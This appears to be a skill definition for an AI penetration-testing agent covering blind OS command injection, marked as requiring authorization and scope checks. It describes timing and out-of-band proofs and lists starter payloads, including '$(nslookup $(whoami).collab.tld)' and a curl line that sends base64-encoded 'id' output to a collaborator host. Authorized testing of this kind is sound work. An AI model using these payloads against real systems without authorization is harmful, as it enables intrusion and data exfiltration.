---
name: blind-command-injection
description: >-
  Exploit OS command injection with no reflected output (CWE-78), confirming via a time delay
  or an out-of-band callback. Invoke when a param likely reaches a shell but the response never
  shows command output. Uses util-timing-oracle (sleep) or util-oast-oob (DNS/HTTP exfil) as
  the proof, then exfiltrates data OOB.
family: 04-injection
type: exploit
owasp: [A03:2021]
cwe: [CWE-78]
requires: [scope-guard, util-timing-oracle, util-oast-oob, evidence-recorder]
authorization: required
---

# Blind Command Injection

## Invoke when
- Shell reachability is suspected but no output returns.

## Methodology
1. Timing proof: inject `sleep 5` conditionally; confirm delay vs control (statistical, not one-shot).
2. OOB proof: inject a DNS/HTTP callback to a unique collaborator subdomain.
3. Exfil data via OOB: encode command output into the callback hostname/path.
4. Handle separators/quoting exactly as in-band, minus the output read.

## Starter payloads
- `; sleep 5`, `&& ping -c1 collab.tld`, `$(nslookup $(whoami).collab.tld)`,
  `| curl http://collab.tld/$(id|base64)`.

## False-positive filters
- Single slow response = jitter; require reproducible delay vs no-delay control.

## Chains to
- `ssrf-triage` (if only DNS resolves, not full egress), `chain-builder`.
